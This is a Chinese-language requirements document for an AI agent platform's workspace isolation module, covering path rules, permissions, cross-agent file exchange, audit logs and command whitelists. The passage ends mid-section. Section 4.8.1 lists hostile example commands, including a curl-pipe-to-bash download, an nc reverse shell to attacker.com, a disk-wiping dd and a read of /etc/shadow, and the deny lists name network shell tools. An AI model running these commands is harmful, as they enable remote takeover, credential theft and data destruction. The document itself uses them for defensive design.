# DPSK-OPC Agent 工作空间模块需求文档

> **版本**: v1.0.6  
> **创建日期**: 2026-04-23  
> **作者**: DPSK-OPC 架构组  
> **状态**: 待开发

---

## 一、需求概述

### 1.1 背景与目标

在 DPSK-OPC 一人公司 AI 操作系统中，Agent 是最小执行单元。当前 Agent 具备文件操作工具（读写、搜索、命令执行等），但这些操作缺乏系统级的安全隔离，存在越权访问风险。

**核心目标**：

| 目标 | 说明 |
|------|------|
| **工作空间隔离** | 每个 Agent 的所有操作限定在固定的工作空间目录内 |
| **系统级强制** | 不依赖 LLM 理解，通过中间件在工具层强制执行 |
| **层级关系兼容** | 与 Agent 的 team/workspace/dependencies 层级关系配合 |
| **安全模块集成** | 预留 Firecracker 沙箱集成接口 |
| **跨 Agent 安全协作** | 通过 Exchange Service 实现文件安全交换 |

### 1.2 适用范围

本文档描述 Agent 工作空间模块的完整需求，包括：

- 核心概念与数据模型
- 工作空间生命周期管理
- 路径验证与权限控制
- 工具层安全装饰器
- 跨 Agent 文件交换服务
- 与安全模块的集成接口
- 审计日志

### 1.3 术语表

| 术语 | 说明 |
|------|------|
| Workspace | Agent 的隔离工作空间，对应物理存储目录 `/storage/ws/{agent_id}/` |
| WorkspaceManager | 工作空间管理器，负责创建、验证、销毁工作空间 |
| AgentContext | Agent 执行上下文，包含当前 Agent 的工作空间和权限信息 |
| WorkspaceGuard | 工作空间守卫，工具层装饰器，拦截并验证文件操作 |
| ExchangeService | 跨 Agent 文件交换服务，实现安全的文件传递 |
| Permission | 权限枚举：READ / WRITE / EXECUTE / LIST / DELETE |
| Exchange | 交换区目录 `/exchange/`，用于 Agent 间临时文件传递 |
| PathClassification | 路径分类，将路径划分为不同信任级别 |
| TemporaryPermission | 临时权限，用户授权后授予的限时访问权限 |
| PathCategory | 路径分类枚举：WORKSPACE / USER_HOME / PROJECT / SYSTEM / SENSITIVE / FORBIDDEN |
| Policy | 访问策略枚举：ALLOW / ALLOW_WITH_CONFIRM / DENY |
| SecurityWorkspaceAdapter | 与安全模块（Firecracker）的集成适配器 |
| CommandWhitelist | 命令白名单，仅允许执行的命令列表 |
| ExecutionGuard | 执行守卫，拦截和验证命令执行 |
| NetworkPolicy | 网络访问策略：ALLOW / DENY / ASK |
| ToolSecurityProfile | 工具安全配置，包含路径限制、命令白名单等 |

---

## 二、系统架构

### 2.1 整体架构图

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           DPSK-OPC System                                │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                        API Gateway / Message Bus                     │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                    ↓                                      │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                    Agent Orchestration Layer                          │ │
│  │                                                                       │ │
│  │   ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │ │
│  │   │ 秘书 Agent    │  │ 行政助理      │  │ 研发 Agent    │           │ │
│  │   │ Workspace-1   │  │ Workspace-2   │  │ Workspace-3   │           │ │
│  │   └──────┬───────┘  └──────┬───────┘  └──────┬───────┘           │ │
│  └──────────┼─────────────────┼─────────────────┼────────────────────┘ │
│             ↓                 ↓                 ↓                       │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                    Workspace Security Layer                          │ │
│  │                                                                       │ │
│  │   ┌────────────────────────────────────────────────────────────┐   │ │
│  │   │              AgentContext + Middleware                       │   │ │
│  │   │   • AgentContext: 当前执行上下文                            │   │ │
│  │   │   • WorkspaceGuard: 路径验证 + 权限检查                     │   │ │
│  │   │   • AuditLogger: 操作审计                                   │   │ │
│  │   └────────────────────────────────────────────────────────────┘   │ │
│  │                                                                       │ │
│  │   ┌────────────────────────────────────────────────────────────┐   │ │
│  │   │              WorkspaceManager                               │   │ │
│  │   │   • 工作空间生命周期管理                                    │   │ │
│  │   │   • 路径验证（realpath、符号链接检测）                      │   │ │
│  │   │   • 权限检查                                                │   │ │
│  │   └────────────────────────────────────────────────────────────┘   │ │
│  │                                                                       │ │
│  │   ┌────────────────────────────────────────────────────────────┐   │ │
│  │   │              ExchangeService                                 │   │ │
│  │   │   • Agent 间文件安全交换（只写不读）                         │   │ │
│  │   │   • 权限验证 + 生命周期管理                                  │   │ │
│  │   └────────────────────────────────────────────────────────────┘   │ │
│  │                                                                       │ │
│  │   ┌────────────────────────────────────────────────────────────┐   │ │
│  │   │         SecurityWorkspaceAdapter (接口)                      │   │ │
│  │   │   • 预留给 Firecracker 安全模块的集成点                      │   │ │
│  │   └────────────────────────────────────────────────────────────┘   │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                    ↓                                      │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                          Storage Layer                              │ │
│  │                                                                       │ │
│  │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐               │ │
│  │   │ /ws/secret/ │  │ /ws/ops/    │  │ /ws/rnd/    │   ← Agent WS  │ │
│  │   ├─────────────┤  ├─────────────┤  ├─────────────┤               │ │
│  │   │ /exchange/  │  │ /shared/     │  │ /audit/     │   ← 系统目录  │ │
│  │   └─────────────┘  └─────────────┘  └─────────────┘               │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2.2 目录结构

```
/storage/                          # 根存储目录（可配置）
├── /ws/                           # Agent 工作空间根目录
│   ├── /ws/secretary/            # 秘书工作空间
│   ├── /ws/admin-assistant/      # 行政助理工作空间
│   └── /ws/{agent_id}/          # 其他 Agent 工作空间
│
├── /exchange/                     # 跨 Agent 文件交换目录
│   ├── {exchange_id}.file        # 文件内容
│   └── {exchange_id}.meta         # 元数据（创建者、可读 Agent 列表、过期时间）
│
├── /shared/                       # 共享目录（管理员配置）
│   ├── /public/                   # 公开只读目录
│   └── {custom}/                  # 自定义白名单目录
│
└── /audit/                        # 审计日志目录
    └── {date}.log                 # 按日期存储的审计日志
```

---

## 三、数据模型

### 3.1 Permission 权限枚举

```python
class Permission(Flag):
    """Agent 工作空间权限"""
    NONE = 0           # 无权限
    READ = auto()     # 读取文件
    WRITE = auto()    # 写入/修改文件
    EXECUTE = auto()  # 执行命令
    LIST = auto()     # 列出目录
    DELETE = auto()   # 删除文件
```

### 3.2 Workspace 数据模型

```python
@dataclass
class Workspace:
    """工作空间模型"""
    
    workspace_id: str                    # 工作空间唯一标识，格式: ws_{agent_id}
    agent_id: str                        # 关联的 Agent ID
    root_path: Path                      # 工作空间根目录路径
    permissions: Permission              # 当前持有的权限
    created_at: float                    # 创建时间戳
    updated_at: float                    # 更新时间戳
    
    # 共享配置
    shared_dirs: list[Path] = field(default_factory=list)  # 白名单共享目录
    pending_shared_access: list[SharedAccessRequest] = field(default_factory=list)  # 待审批的临时共享
    
    # 层级关系
    parent_workspace_id: Optional[str] = None  # 父工作空间（可继承权限）
    child_workspace_ids: list[str] = field(default_factory=list)
    
    # 状态
    status: WorkspaceStatus = WorkspaceStatus.ACTIVE  # ACTIVE / ARCHIVED / DELETED
    
    # 沙箱配置（预留给 Firecracker）
    sandbox_config: Optional[dict] = None


class WorkspaceStatus(Enum):
    """工作空间状态"""
    ACTIVE = "active"      # 活跃
    ARCHIVED = "archived"  # 已归档
    DELETED = "deleted"    # 已删除
```

### 3.3 SharedAccessRequest 临时共享请求

```python
@dataclass
class SharedAccessRequest:
    """临时共享访问请求"""
    
    request_id: str                      # 请求唯一标识
    from_agent_id: str                   # 请求方 Agent
    to_agent_id: str                     # 被授权方 Agent
    target_path: Path                     # 目标路径
    requested_permissions: Permission    # 请求的权限
    reason: str                          # 申请理由
    expires_at: Optional[float] = None   # 过期时间（可选）
    status: SharedAccessStatus = SharedAccessStatus.PENDING  # 状态
    created_at: float                    # 创建时间


class SharedAccessStatus(Enum):
    """共享请求状态"""
    PENDING = "pending"     # 待审批
    APPROVED = "approved"    # 已批准
    REJECTED = "rejected"    # 已拒绝
    EXPIRED = "expired"      # 已过期
```

### 3.4 Exchange 元数据模型

```python
@dataclass
class ExchangeMeta:
    """交换区文件元数据"""
    
    exchange_id: str                    # 交换文件唯一标识
    from_agent_id: str                   # 发送方 Agent
    authorized_agents: list[str]         # 授权可读的 Agent 列表
    original_filename: str               # 原始文件名
    created_at: float                    # 创建时间
    expires_at: Optional[float]          # 过期时间（默认 24 小时）
    status: ExchangeStatus = ExchangeStatus.ACTIVE  # ACTIVE / CONSUMED / EXPIRED


class ExchangeStatus(Enum):
    """交换文件状态"""
    ACTIVE = "active"      # 活跃，可被读取
    CONSUMED = "consumed"  # 已被接收方读取
    EXPIRED = "expired"     # 已过期
```

### 3.5 AgentContext 执行上下文

```python
@dataclass
class AgentContext:
    """Agent 执行上下文（线程/协程本地存储）"""
    
    agent_id: str                        # 当前 Agent ID
    workspace_id: str                    # 当前工作空间 ID
    workspace_root: Path                  # 工作空间根目录
    permissions: Permission               # 当前持有权限
    session_id: Optional[str] = None     # 当前会话 ID（用于多任务）
    parent_context: Optional[AgentContext] = None  # 父上下文（dispatch 时）
    temporary_permissions: list[TemporaryPermission] = field(default_factory=list)  # 临时权限列表
```

### 3.6 路径分类与策略

```python
class PathCategory(Enum):
    """路径分类"""
    WORKSPACE = "workspace"        # Agent 工作空间
    SHARED = "shared"             # 共享白名单目录
    USER_HOME = "user_home"       # 用户主目录
    PROJECT = "project"           # 项目目录
    SYSTEM = "system"             # 系统目录
    SENSITIVE = "sensitive"       # 敏感目录
    FORBIDDEN = "forbidden"       # 禁止目录


class Policy(Enum):
    """访问策略"""
    ALLOW = "allow"                           # 自动允许
    ALLOW_WITH_CONFIRM = "allow_with_confirm"  # 确认后允许
    DENY = "deny"                            # 自动拒绝


@dataclass
class PathClassification:
    """路径分类配置"""
    
    pattern: str                    # 路径模式（支持 glob，如 /etc/*）
    category: PathCategory          # 分类
    default_policy: Policy          # 默认策略
    requires_user_confirmation: bool = False  # 是否需要用户确认


class DefaultPathRules:
    """默认路径分类规则"""
    
    RULES: list[PathClassification] = [
        # Agent 工作空间 - 自动允许
        PathClassification("/storage/ws/*", PathCategory.WORKSPACE, Policy.ALLOW),
        PathClassification("/storage/shared/*", PathCategory.SHARED, Policy.ALLOW),
        
        # 用户目录 - 需要确认
        PathClassification("/home/*", PathCategory.USER_HOME, Policy.ALLOW_WITH_CONFIRM),
        PathClassification("~/*", PathCategory.USER_HOME, Policy.ALLOW_WITH_CONFIRM),
        
        # 项目目录 - 需要确认
        PathClassification("/mnt/*", PathCategory.PROJECT, Policy.ALLOW_WITH_CONFIRM),
        PathClassification("/workspace/*", PathCategory.PROJECT, Policy.ALLOW_WITH_CONFIRM),
        
        # 系统目录 - 自动拒绝
        PathClassification("/etc/*", PathCategory.SYSTEM, Policy.DENY),
        PathClassification("/usr/*", PathCategory.SYSTEM, Policy.DENY),
        PathClassification("/var/*", PathCategory.SYSTEM, Policy.DENY),
        
        # 敏感目录 - 自动拒绝
        PathClassification("/root/*", PathCategory.SENSITIVE, Policy.DENY),
        PathClassification("/proc/*", PathCategory.SENSITIVE, Policy.DENY),
        PathClassification("/sys/*", PathCategory.SENSITIVE, Policy.DENY),
        
        # 禁止目录 - 自动拒绝
        PathClassification("/", PathCategory.FORBIDDEN, Policy.DENY),
        PathClassification("/bin/*", PathCategory.FORBIDDEN, Policy.DENY),
        PathClassification("/sbin/*", PathCategory.FORBIDDEN, Policy.DENY),
        PathClassification("/boot/*", PathCategory.FORBIDDEN, Policy.DENY),
        PathClassification("/dev/*", PathCategory.FORBIDDEN, Policy.DENY),
    ]
```

### 3.7 临时权限

```python
class TempPermissionScope(Enum):
    """临时权限作用域"""
    ONE_TIME = "one_time"           # 一次有效
    TASK_SCOPE = "task_scope"       # 本次任务内有效
    SESSION_SCOPE = "session_scope"  # 本次会话内有效
    PERMANENT = "permanent"          # 永久（加入白名单）


@dataclass
class TemporaryPermission:
    """临时权限"""
    
    permission_id: str                    # 权限唯一标识
    agent_id: str                        # 授权的 Agent
    path: Path                            # 授权路径
    permission: Permission                # 授予的权限
    scope: TempPermissionScope            # 作用域
    granted_by: str                       # 授权者（用户 ID）
    task_id: Optional[str] = None         # 关联任务 ID（用于 TASK_SCOPE）
    session_id: Optional[str] = None      # 关联会话 ID（用于 SESSION_SCOPE）
    created_at: float = field(default_factory=time.time)  # 创建时间
    expires_at: Optional[float] = None   # 过期时间
    status: TempPermissionStatus = TempPermissionStatus.ACTIVE  # 状态


class TempPermissionStatus(Enum):
    """临时权限状态"""
    ACTIVE = "active"      # 生效中
    EXPIRED = "expired"    # 已过期
    REVOKED = "revoked"    # 已撤销
    CONSUMED = "consumed"   # 已使用（ONE_TIME 场景）


@dataclass
class PendingConfirmation:
    """待确认的权限请求"""
    
    request_id: str                    # 请求 ID
    agent_id: str                      # 申请权限的 Agent
    path: str                          # 请求的路径
    operation: str                     # 操作类型（read/write/execute）
    reason: str                        # 申请理由
    task_id: Optional[str] = None      # 关联任务 ID
    created_at: float = field(default_factory=time.time)
    status: ConfirmationStatus = ConfirmationStatus.PENDING


class ConfirmationStatus(Enum):
    """确认状态"""
    PENDING = "pending"     # 待确认
    APPROVED = "approved"   # 已批准
    REJECTED = "rejected"   # 已拒绝
    TIMEOUT = "timeout"     # 超时未响应

### 3.8 执行安全配置

```python
class NetworkPolicy(Enum):
    """网络访问策略"""
    ALLOW = "allow"         # 允许
    DENY = "deny"           # 禁止
    ASK = "ask"             # 询问


@dataclass
class CommandRule:
    """命令规则"""
    pattern: str                    # 命令模式（支持 glob）
    action: CommandAction          # ALLOW / DENY
    description: str = ""          # 规则说明


class CommandAction(Enum):
    """命令动作"""
    ALLOW = "allow"         # 允许
    DENY = "deny"          # 禁止


class DefaultCommandRules:
    """默认命令规则"""
    
    # 允许的命令（白名单）
    ALLOWED: list[CommandRule] = [
        CommandRule("git", CommandAction.ALLOW, "版本控制"),
        CommandRule("python*", CommandAction.ALLOW, "Python 解释器"),
        CommandRule("node*", CommandAction.ALLOW, "Node.js 运行时"),
        CommandRule("pip*", CommandAction.ALLOW, "Python 包管理"),
        CommandRule("npm*", CommandAction.ALLOW, "Node.js 包管理"),
        CommandRule("ls", CommandAction.ALLOW, "列出目录"),
        CommandRule("cat", CommandAction.ALLOW, "查看文件"),
        CommandRule("cp", CommandAction.ALLOW, "复制文件"),
        CommandRule("mv", CommandAction.ALLOW, "移动文件"),
        CommandRule("mkdir", CommandAction.ALLOW, "创建目录"),
        CommandRule("ps", CommandAction.ALLOW, "查看进程"),
        CommandRule("df", CommandAction.ALLOW, "查看磁盘"),
        CommandRule("free", CommandAction.ALLOW, "查看内存"),
    ]
    
    # 禁止的命令（黑名单）
    DENIED: list[CommandRule] = [
        CommandRule("curl", CommandAction.DENY, "禁止网络下载"),
        CommandRule("wget", CommandAction.DENY, "禁止网络下载"),
        CommandRule("nc", CommandAction.DENY, "禁止网络工具"),
        CommandRule("ncat", CommandAction.DENY, "禁止网络工具"),
        CommandRule("bash", CommandAction.DENY, "禁止 bash"),
        CommandRule("sh", CommandAction.DENY, "禁止 sh"),
        CommandRule("zsh", CommandAction.DENY, "禁止 zsh"),
        CommandRule("fish", CommandAction.DENY, "禁止 fish"),
        CommandRule("dd", CommandAction.DENY, "禁止磁盘操作"),
        CommandRule("mkfs", CommandAction.DENY, "禁止格式化"),
        CommandRule("fdisk", CommandAction.DENY, "禁止磁盘分区"),
        CommandRule("ssh", CommandAction.DENY, "禁止 SSH"),
        CommandRule("scp", CommandAction.DENY, "禁止 SCP"),
        CommandRule("ftp", CommandAction.DENY, "禁止 FTP"),
        CommandRule("telnet", CommandAction.DENY, "禁止 Telnet"),
        CommandRule("rm", CommandAction.DENY, "禁止删除（限制）"),
    ]


@dataclass
class ExecutionConfig:
    """执行配置"""
    
    command_rules: list[CommandRule] = field(default_factory=list)  # 命令规则
    network_policy: NetworkPolicy = NetworkPolicy.DENY               # 网络策略
    allowed_hosts: list[str] = field(default_factory=list)         # 允许的主机
    blocked_ports: list[str] = field(default_factory=list)         # 禁止的端口
    timeout_seconds: int = 60                                       # 超时时间
    max_output_size: int = 1024 * 1024  # 1MB，最大输出大小
    cleanup_env_vars: list[str] = field(default_factory=lambda: [
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
    ])  # 需要清理的环境变量


@dataclass
class SearchConfig:
    """搜索配置"""
    
    max_results: int = 1000                # 最大结果数
    ignored_dirs: list[str] = field(default_factory=lambda: [
        ".git",
        "node_modules",
        "__pycache__",
        ".venv",
        "venv",
    ])  # 忽略的目录
    ignored_patterns: list[str] = field(default_factory=lambda: [
        "*.pyc",
        "*.pyo",
        "*.so",
        "*.dll",
        "*.dylib",
    ])  # 忽略的文件模式


@dataclass
class ToolSecurityProfile:
    """工具安全配置"""
    
    workspace: Workspace                      # 工作空间
    execution: ExecutionConfig = field(default_factory=ExecutionConfig)  # 执行配置
    search: SearchConfig = field(default_factory=SearchConfig)          # 搜索配置
    allowed_paths: list[Path] = field(default_factory=list)             # 允许的额外路径
    denied_paths: list[Path] = field(default_factory=list)             # 禁止的路径
    network_enabled: bool = False             # 是否允许网络访问
```
```

---

## 四、功能需求

### 4.1 工作空间管理

#### 4.1.1 WorkspaceManager

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.1.1-01 | WorkspaceManager 创建工作空间，自动创建物理目录 | P0 |
| FR-4.1.1-02 | WorkspaceManager 根据 agent_id 获取工作空间 | P0 |
| FR-4.1.1-03 | WorkspaceManager 验证路径是否在工作空间范围内 | P0 |
| FR-4.1.1-04 | WorkspaceManager 支持符号链接检测，防止路径穿越 | P0 |
| FR-4.1.1-05 | WorkspaceManager 支持工作空间归档和删除 | P1 |
| FR-4.1.1-06 | WorkspaceManager 支持共享目录白名单配置 | P1 |

#### 4.1.2 路径验证规则

| 规则 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.1.2-01 | 所有路径必须解析到真实路径（resolve()）后才能验证 | P0 |
| FR-4.1.2-02 | 路径必须在工作空间根目录或其白名单目录下 | P0 |
| FR-4.1.2-03 | 符号链接目标不能穿越工作空间边界 | P0 |
| FR-4.1.2-04 | 路径中不能包含 `..` 跳转到上级目录 | P0 |

### 4.2 权限控制

#### 4.2.1 默认权限

| Agent 类型 | 默认权限 | 说明 |
|------------|----------|------|
| 普通 Agent | READ, LIST | 只读，不能写入文件 |
| 管理员 Agent | READ, WRITE, LIST, DELETE | 可读写，但需明确配置 |

#### 4.2.2 权限检查

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.2.2-01 | 读取文件需要 READ 权限 | P0 |
| FR-4.2.2-02 | 写入文件需要 WRITE 权限 | P0 |
| FR-4.2.2-03 | 执行命令需要 EXECUTE 权限 | P0 |
| FR-4.2.2-04 | 列出目录需要 LIST 权限 | P0 |
| FR-4.2.2-05 | 删除文件需要 DELETE 权限 | P0 |

### 4.3 工具层安全装饰器

#### 4.3.1 WorkspaceGuard

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.3.1-01 | WorkspaceGuard 拦截所有文件操作工具 | P0 |
| FR-4.3.1-02 | 拦截时获取当前 AgentContext | P0 |
| FR-4.3.1-03 | 拦截时验证路径和权限 | P0 |
| FR-4.3.1-04 | 验证失败时返回结构化错误，不执行原操作 | P0 |
| FR-4.3.1-05 | 验证通过后执行原工具，记录审计日志 | P0 |
| FR-4.3.1-06 | 支持的工具：read_file, write_to_file, list_dir, search_file, search_content, replace_in_file, delete_file, execute_command | P0 |

#### 4.3.2 错误响应格式

```python
# 访问被拒绝时的统一错误格式
{
    "success": False,
    "error": "[Workspace Guard] 路径 '/xxx' 不在工作空间 '/storage/ws/admin-assistant/' 内",
    "code": "WORKSPACE_ACCESS_DENIED"
}
```

### 4.4 跨 Agent 文件交换

#### 4.4.1 ExchangeService

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.4.1-01 | Agent 调用 push_file 将文件推送到交换区 | P0 |
| FR-4.4.1-02 | 推送时指定授权读取的 Agent 列表 | P0 |
| FR-4.4.1-03 | Agent 调用 pull_file 从交换区拉取文件 | P0 |
| FR-4.4.1-04 | 拉取时验证调用方是否在授权列表中 | P0 |
| FR-4.4.1-05 | 支持过期时间设置，自动清理过期文件 | P1 |
| FR-4.4.1-06 | Exchange 目录中的文件只能被交换服务读写，Agent 无直接访问权限 | P0 |

#### 4.4.2 交换规则

| 规则 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.4.2-01 | 发送方 Agent 只能写入交换区，不能读取交换区 | P0 |
| FR-4.4.2-02 | 接收方 Agent 只能读取被授权的文件 | P0 |
| FR-4.4.2-03 | 交换文件默认 24 小时后过期 | P1 |
| FR-4.4.2-04 | 交换文件内容不暴露物理路径给 Agent | P0 |

### 4.5 审计日志

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.5-01 | 记录所有文件操作：agent_id、operation、path、result、timestamp | P0 |
| FR-4.5-02 | 记录所有跨 Agent 文件交换 | P0 |
| FR-4.5-03 | 记录权限验证失败事件 | P0 |
| FR-4.5-04 | 审计日志按日期分文件存储 | P1 |
| FR-4.5-05 | 审计日志格式为 JSON Lines | P1 |

#### 4.5.1 审计日志格式

```json
{
    "timestamp": "2026-04-23T16:30:00.000Z",
    "event_type": "workspace_access",
    "agent_id": "admin-assistant",
    "workspace_id": "ws_admin-assistant",
    "operation": "read_file",
    "path": "/storage/ws/admin-assistant/docs/report.md",
    "allowed": true,
    "permission_used": "READ",
    "result": "success"
}
```

### 4.6 临时共享（Agent 间用户审批）

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.6-01 | Agent 可以申请访问其他 Agent 的工作空间 | P2 |
| FR-4.6-02 | 申请触发用户审批流程 | P2 |
| FR-4.6-03 | 审批通过后授予临时访问权限 | P2 |
| FR-4.6-04 | 临时权限支持过期时间 | P2 |

### 4.7 用户引导的工作空间访问

#### 4.7.1 问题场景

当前方案解决了 **Agent 自主决定** 的读写安全问题，但未覆盖 **用户明确指示** 的场景：

| 场景 | 示例 | 问题 |
|------|------|------|
| 用户让 Agent 保存文件到工作空间外 | "帮我把报告保存到 ~/docs/report.md" | 路径不在工作空间内 |
| 用户让 Agent 读取系统配置 | "帮我看看 /etc/nginx/nginx.conf" | 路径在禁止列表内 |

#### 4.7.2 路径分类与信任层级

系统将路径划分为不同信任级别：

| 路径类型 | 示例 | 默认策略 | 用户确认 |
|----------|------|----------|----------|
| **Agent Workspace** | `/storage/ws/admin-assistant/` | ✅ 自动允许 | ❌ 不确认 |
| **共享白名单** | `/storage/shared/public/` | ✅ 自动允许 | ❌ 不确认 |
| **用户目录** | `/home/user/`, `~/` | ⚠️ 提示确认 | ✅ 确认一次 |
| **项目目录** | `/mnt/w/workspace/` | ⚠️ 提示确认 | ✅ 确认一次 |
| **系统目录** | `/etc/`, `/usr/` | 🚫 自动拒绝 | - |
| **敏感目录** | `/root/`, `/proc/`, `/sys/` | 🚫 自动拒绝 | - |
| **禁止目录** | `/`, `/bin/`, `/boot/` | 🚫 自动拒绝 | - |

#### 4.7.3 路径检查决策流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    路径检查决策流程                               │
│                                                                  │
│   Agent 调用工具 (filePath="/home/user/docs/report.md")          │
│                            ↓                                     │
│   WorkspaceGuard 拦截                                              │
│                            ↓                                     │
│   ┌─────────────────────────────────────────────────────────┐    │
│   │                   路径分类检查                            │    │
│   │                                                         │    │
│   │   ├── 工作空间内？  → ✅ 直接执行（允许）                 │    │
│   │   │                                                         │    │
│   │   ├── 白名单目录？  → ✅ 直接执行（允许）                 │    │
│   │   │                                                         │    │
│   │   ├── 禁止目录？    → 🚫 拒绝（自动拒绝）                 │    │
│   │   │                    → 返回错误码 DENIED_PATH          │    │
│   │   │                                                         │    │
│   │   └── 其他目录？    → ⚠️ 进入用户确认流程                │    │
│   │                        ↓                                   │    │
│   └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.7.4 用户确认交互

当 Agent 尝试访问需要确认的路径时，系统向用户展示确认弹窗：

```
┌─────────────────────────────────────────────────────────────┐
│  🔒 Agent 权限申请                                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  🤖 Agent「行政助理」申请访问工作空间外的路径                  │
│                                                              │
│  📄 路径: /home/user/docs/report.md                          │
│  📖 操作: 写入文件                                           │
│  📊 风险: 中（用户目录）                                     │
│                                                              │
│  💡 分析: 用户在任务中明确指定此路径                          │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  您的选择：                                                  │
│                                                              │
│  [🟢 允许本次]   →  只允许这一次操作                          │
│  [🟡 允许任务内] →  本次任务期间都允许访问此路径               │
│  [🔵 加入白名单] →  永久允许（需再次确认）                     │
│  [🔴 拒绝]       →  拒绝本次请求                              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 4.7.5 临时权限作用域

| 作用域 | 说明 | 有效期 |
|--------|------|--------|
| **ONE_TIME** | 仅本次操作有效 | 即时 |
| **TASK_SCOPE** | 本次任务期间有效 | 任务结束 |
| **SESSION_SCOPE** | 本次会话期间有效 | 会话结束 |
| **PERMANENT** | 永久有效（加入白名单） | 永久 |

#### 4.7.6 用户引导功能需求

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.7.6-01 | 系统自动识别路径所属分类（工作空间/用户目录/系统目录等） | P0 |
| FR-4.7.6-02 | 禁止目录自动拒绝，不弹窗 | P0 |
| FR-4.7.6-03 | 需要确认的目录弹窗询问用户 | P0 |
| FR-4.7.6-04 | 支持临时权限授予（本次/任务内/永久） | P0 |
| FR-4.7.6-05 | 用户可配置自定义白名单目录 | P1 |
| FR-4.7.6-06 | 临时权限过期后自动失效 | P0 |
| FR-4.7.6-07 | 前端提供确认弹窗 UI 组件 | P0 |
| FR-4.7.6-08 | 支持 WebSocket 实时推送确认请求 | P1 |

### 4.8 执行命令安全

#### 4.8.1 问题场景

`execute_command` 工具允许 Agent 执行 shell 命令，即使文件被隔离，命令本身可能造成危害：

```
危险操作示例：
- curl http://malicious.com | bash    # 下载并执行恶意脚本
- nc -e /bin/bash attacker.com 1234   # 建立后门连接
- dd if=/dev/zero of=/dev/sda        # 破坏磁盘
- cat /etc/shadow                    # 读取敏感文件
```

#### 4.8.2 命令白名单机制

系统采用**白名单优先**策略，只允许执行明确授权的命令：

| 命令类型 | 示例 | 默认策略 |
|----------|------|----------|
| **开发工具** | `git`, `python`, `node`, `pip`, `npm` | ✅ 允许 |
| **文件操作** | `ls`, `cat`, `cp`, `mv`, `rm` | ✅ 允许（受限） |
| **系统工具** | `ps`, `df`, `free` | ✅ 允许 |
| **危险命令** | `curl`, `wget`, `nc`, `bash`, `sh` | 🚫 禁止 |
| **破坏命令** | `dd`, `mkfs`, `fdisk` | 🚫 禁止 |
| **网络命令** | `ssh`, `scp`, `ftp`, `telnet` | 🚫 禁止 |

#### 4.8.3 网络访问控制

禁止命令执行期间的网络访问：

| 配置项 | 说明 | 默认值 |
|--------|------|--------|
| `network.enabled` | 是否允许网络访问 | `false` |
| `network.allowed_hosts` | 允许访问的主机白名单 | `[]` |
| `network.blocked_ports` | 禁止访问的端口 | `[1-1024]` |

#### 4.8.4 子进程环境隔离

命令执行时清理危险环境变量：

```
移除的环境变量：
- LD_PRELOAD        # 禁止预加载库
- LD_LIBRARY_PATH   # 禁止自定义库路径
- PYTHONPATH        # 禁止 Python 路径注入
- PATH（自定义）    # 使用受限 PATH

工作目录锁定：
- 只能在工作空间内 cd
- 禁止 cd 到禁止目录
```

#### 4.8.5 执行命令安全需求

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.8.5-01 | 命令白名单机制：只允许白名单中的命令 | P0 |
| FR-4.8.5-02 | 危险命令黑名单：自动拒绝高危命令 | P0 |
| FR-4.8.5-03 | 命令参数校验：禁止危险参数组合 | P0 |
| FR-4.8.5-04 | 子进程环境隔离：清理危险环境变量 | P0 |
| FR-4.8.5-05 | 工作目录锁定：禁止 cd 到禁止目录 | P0 |
| FR-4.8.5-06 | 执行超时限制：默认 60 秒超时 | P0 |
| FR-4.8.5-07 | 执行结果大小限制：防止内存耗尽 | P0 |
| FR-4.8.5-08 | 支持 Agent 级别命令白名单配置 | P1 |

### 4.9 搜索工具安全

#### 4.9.1 问题场景

`search_file` 和 `search_content` 递归搜索可能扫描整个文件系统：

```
Agent 调用: search_content(pattern="password", path="/")
结果: 可能返回 /etc/passwd, ~/.ssh/*, 各种配置文件
```

#### 4.9.2 搜索路径限制

| 规则 | 说明 | 优先级 |
|------|------|--------|
| 必须在工作空间内 | 搜索根路径必须在工作空间或白名单内 | P0 |
| 禁止根路径搜索 | 禁止 `path="/"` 或 `path="~"` | P0 |
| 展开 HOME 目录 | `~` 必须展开为实际路径 | P0 |

#### 4.9.3 搜索结果过滤

| 规则 | 说明 | 优先级 |
|------|------|--------|
| 结果数量限制 | 单次搜索最多返回 1000 条结果 | P0 |
| 忽略隐藏目录 | `.git`, `node_modules` 等默认忽略 | P1 |
| 忽略二进制文件 | 不搜索二进制文件内容 | P1 |

#### 4.9.4 搜索工具安全需求

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.9.4-01 | 搜索路径必须在工作空间或白名单内 | P0 |
| FR-4.9.4-02 | 禁止空根路径搜索（`/` 或 `~`） | P0 |
| FR-4.9.4-03 | HOME 目录必须展开为实际路径 | P0 |
| FR-4.9.4-04 | 搜索结果数量限制 | P0 |
| FR-4.9.4-05 | 忽略常见临时文件和缓存目录 | P1 |

### 4.10 目录列表安全

#### 4.10.1 问题场景

`list_dir` 可能暴露禁止目录的存在性：

```
即使无法读取 /etc 内容，但可以看到 /etc 存在
即使无法读取 /root 内容，但可以知道 /root 目录存在
```

